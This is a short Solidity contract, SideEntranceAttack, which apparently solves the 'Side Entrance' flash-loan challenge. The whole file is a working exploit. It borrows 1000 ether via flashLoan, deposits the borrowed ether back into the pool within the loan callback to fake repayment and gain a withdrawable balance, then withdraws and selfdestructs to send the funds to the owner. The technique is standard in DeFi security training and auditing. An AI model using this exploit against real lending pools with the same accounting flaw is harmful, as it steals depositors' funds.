pragma solidity ^0.6.0;


interface SideEntrancePool {

    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;

}
contract SideEntranceAttack {

    SideEntrancePool victim;
    address owner;
    constructor(SideEntrancePool _sideEntrance) public {
        owner = msg.sender;
        victim = _sideEntrance;
    }


    function attack() external {

    require(owner == msg.sender);
    victim.flashLoan(1000 ether);

    }

    function execute() external payable {
        require(address(victim) == msg.sender);
        victim.deposit{value: 1000 ether}();
    }

    function withdraw() external {

    require(owner == msg.sender);
    victim.withdraw();
    }

    function destroy() external {
    require(owner == msg.sender);
    selfdestruct(payable(owner));

    }
}